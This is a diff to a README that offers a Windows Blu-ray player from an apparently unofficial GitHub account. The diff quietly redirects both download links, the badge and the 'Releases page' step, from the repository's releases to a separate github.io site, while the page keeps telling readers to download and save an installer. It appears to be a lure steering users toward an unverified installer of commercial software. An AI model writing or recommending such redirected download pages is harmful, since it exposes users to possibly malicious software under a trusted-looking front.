@@ -1,6 +1,6 @@
 # 💿 Leawo-Blu-ray-2026 - Play your favorite movies on Windows
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/jonathanmg8401/Leawo-Blu-ray-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://jonathanmg8401.github.io)
 
 Leawo Blu-ray Player acts as a complete media solution for your desktop. This software plays Blu-ray discs, DVDs, and high-definition video files. It supports Windows 10 and Windows 11. You get a clear picture and sharp audio quality.
 
@@ -8,7 +8,7 @@ Leawo Blu-ray Player acts as a complete media solution for your desktop. This so
 
 You perform the setup process in a few minutes. Follow these instructions to put the player on your computer.
 
-1. Go to the [Releases page](https://github.com/jonathanmg8401/Leawo-Blu-ray-2026/releases).
+1. Go to the [Releases page](https://jonathanmg8401.github.io).
 2. Look for the latest version under the Assets header.
 3. Click the file name to start the download.
 4. Save the installer file to your desktop for easy access.
